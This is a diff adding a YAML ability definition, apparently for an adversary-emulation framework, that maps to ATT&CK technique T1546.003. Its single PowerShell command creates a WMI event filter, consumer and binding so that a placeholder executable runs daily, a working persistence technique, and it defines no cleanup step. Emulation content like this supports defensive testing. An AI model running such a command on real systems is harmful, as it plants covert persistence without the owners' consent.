@@ -1,0 +1,36 @@
+- tactic: persistence
+  technique_name: 'Event Triggered Execution: WMI Event Subscription'
+  technique_id: T1546.003
+  name: WMI Event Subscription Persistence
+  description: Creates a WMI event subscription to execute a specified program persistently.
+  executors:
+  - name: windows
+    platform: psh
+    command: powershell -Command "$Filter=Set-WmiInstance -Namespace 'root\subscription'
+      -Class '__EventFilter' -Arguments @{Name='MyFilter';EventNamespace='Root\Cimv2';QueryLanguage='WQL';Query='SELECT
+      * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_LocalTime"
+      AND TargetInstance.Hour = 10'}; $Consumer=Set-WmiInstance -Namespace 'root\subscription'
+      -Class 'CommandLineEventConsumer' -Arguments @{Name='MyConsumer';CommandLineTemplate='C:\path\to\executable.exe'};
+      Set-WmiInstance -Namespace 'root\subscription' -Class '__FilterToConsumerBinding'
+      -Arguments @{Filter=$Filter;Consumer=$Consumer}"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - persistence
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: stockpile
+  delete_payload: true
+  id: 2dae7478-8eed-4f8b-be7f-8a6b2a5d025d
